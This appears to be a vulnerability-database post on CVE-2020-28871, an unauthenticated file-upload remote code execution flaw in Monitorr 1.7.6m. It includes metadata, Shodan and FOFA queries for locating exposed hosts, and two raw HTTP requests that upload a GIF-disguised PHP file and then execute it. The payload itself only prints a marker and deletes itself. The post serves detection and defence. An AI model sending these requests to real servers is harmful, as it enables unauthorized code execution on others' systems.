---
layout: post
cve_id: CVE-2020-28871
title: Monitorr 1.7.6m - Unauthenticated Remote Code Execution
pcap: true
pcap_path: /pcaps/2020/CVE-2020-28871.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-28871.yaml
snort2_rule: N/A
snort3_rule: N/A
author: gy741
severity: critical
impact: 'Successful exploitation of this vulnerability can lead to unauthorized remote
  code execution on the affected system.

  '
remediation: 'Upgrade to a patched version of Monitorr or apply the necessary security
  patches.

  '
reference:
- https://www.exploit-db.com/exploits/48980
- https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
- https://nvd.nist.gov/vuln/detail/CVE-2020-28871
- http://packetstormsecurity.com/files/163263/Monitorr-1.7.6m-Bypass-Information-Disclosure-Shell-Upload.html
- http://packetstormsecurity.com/files/170974/Monitorr-1.7.6-Shell-Upload.html
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2020-28871
  cwe-id: CWE-434
  epss-score: 0.94046
  epss-percentile: 0.99892
  cpe: cpe:2.3:a:monitorr:monitorr:1.7.6m:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: monitorr
  product: monitorr
  shodan-query: http.favicon.hash:"-211006074"
  fofa-query: icon_hash="-211006074"
tags:
- cve
- cve2020
- unauth
- fileupload
- monitor
- edb
- intrusive
- packetstorm
- rce
- monitorr_project
- monitorr
- vuln
---

## üîç Vulnerability Description
Monitorr 1.7.6m is susceptible to a remote code execution vulnerability. Improper input validation and lack of authorization leads to arbitrary file uploads in the web application. An unauthorized attacker with web access to could upload and execute a specially crafted file, leading to remote code execution within the Monitorr.

## üåê HTTP Request
```nohighlight
POST /assets/php/upload.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.36 (KHTML, like Gecko) Version/8.0 Safari/537.36
Content-Length: 317
Accept: text/plain, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------31046105003900160576454225745
Origin: http://www.victim.com
Referer: http://www.victim.com
X-Requested-With: XMLHttpRequest

-----------------------------31046105003900160576454225745
Content-Disposition: form-data; name="fileToUpload"; filename="38FTNmECeqFGiXB2TywkK0VwesB.php"
Content-Type: image/gif

GIF89a213213123<?php echo md5("CVE-2020-28871");unlink(__FILE__);?>

-----------------------------31046105003900160576454225745--
```

```nohighlight
GET /assets/data/usrimg/38ftnmeceqfgixb2tywkk0vwesb.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10
Connection: close
Accept-Encoding: gzip
```

